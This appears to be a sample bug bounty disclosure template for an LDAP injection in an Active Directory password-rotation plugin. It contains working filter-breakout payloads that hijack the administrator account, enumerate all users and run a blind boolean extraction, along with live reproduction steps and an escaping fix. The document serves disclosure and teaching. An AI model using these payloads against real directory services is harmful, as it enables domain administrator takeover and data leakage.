---
description: "Example: LDAP injection bug bounty submission with working POC"
skill: report-generation
category: Disclosure & Reporting Formats
---

**Title:** LDAP injection in AD rotation plugin lets vault editors hijack any account

**VRT:** Server-Side Injection > LDAP Injection

**Severity:** P2 (High)

**Run:** `python3 poc-ldap-injection.py`
**Pass if:** every `[INJECTION CONFIRMED]` line prints

---

### Summary

An attacker with edit access to a shared credential record changes the `login` field. That single edit takes over any Active Directory account at the next scheduled rotation. The AD rotation plugin interpolates the login field directly into the LDAP search filter without escaping: `f'(&(objectClass=user)(sAMAccountName={name}))'`. The attached POC calls the installed rotation function and captures the LDAP filters it constructs.

**Exploit flow**
1. A contractor or other user with edit access to a shared AD rotation credential record changes the `login` field to include LDAP filter metacharacters.
2. The scheduled password rotation job builds an LDAP search filter directly from that field with no escaping.
3. The injected metacharacters redirect the filter to resolve the administrator's DN instead of the intended account.
4. The rotation job changes the administrator's password and writes the new value to the vault record.
5. The attacker reads the new password from the vault record and logs into the domain controller with full administrator privileges.

### Steps to Reproduce

1. [attacker] Run the offline POC against the installed package:
```
python3 poc-ldap-injection.py
```
**Expect:** every captured filter shows unescaped LDAP metacharacters; the DN_HIJACK case resolves the administrator's DN and changes their password. Full output in Evidence.

For end-to-end reproduction on a live AD environment:

2. [attacker] Create a credential record with the AD rotation plugin, a valid AD host, and valid bind credentials.
3. [attacker] Set the login field to `DOMAIN\administrator)(!(sAMAccountName=jsmith)`.
4. [server] Run the scheduled rotation.
**Expect:** the administrator's password changes and the new value is stored in the vault record.

### Evidence

```
--- WILDCARD_ENUM: Wildcard injection -- enumerate ALL users ---
  Login field value:  DOMAIN\*
  CAPTURED filter:    (&(objectClass=user)(sAMAccountName=*))       <-- rotate() output
  [INJECTION CONFIRMED] Returns every user object in the domain instead of one

--- DN_HIJACK: DN hijack -- change administrator's password instead ---
  Login field value:  DOMAIN\administrator)(!(sAMAccountName=jsmith)
  CAPTURED filter:    (&(objectClass=user)(sAMAccountName=administrator)(!(sAMAccountName=jsmith)))
  [INJECTION CONFIRMED] Resolves to admin DN; modify_password changes admin password  <-- ATO

--- BLIND_BOOLEAN: Boolean-based blind extraction of email prefix ---
  Login field value:  DOMAIN\administrator)(mail=admin@*
  CAPTURED filter:    (&(objectClass=user)(sAMAccountName=administrator)(mail=admin@*))
  [INJECTION CONFIRMED] Binary oracle: result count reveals if email starts with admin@
```

All filters captured from the installed `rotate()` function. The `escape_filter_chars()` function from `ldap3` is already used elsewhere in the same codebase but was not applied here.

### Impact

Full Active Directory account takeover. The attacker controls which account's password is rotated and reads the new password from the credential record.

### Remediation

Apply `escape_filter_chars()` at the interpolation site:
```python
from ldap3.utils.conv import escape_filter_chars
request = f'(&(objectClass=user)(sAMAccountName={escape_filter_chars(name)}))'
```
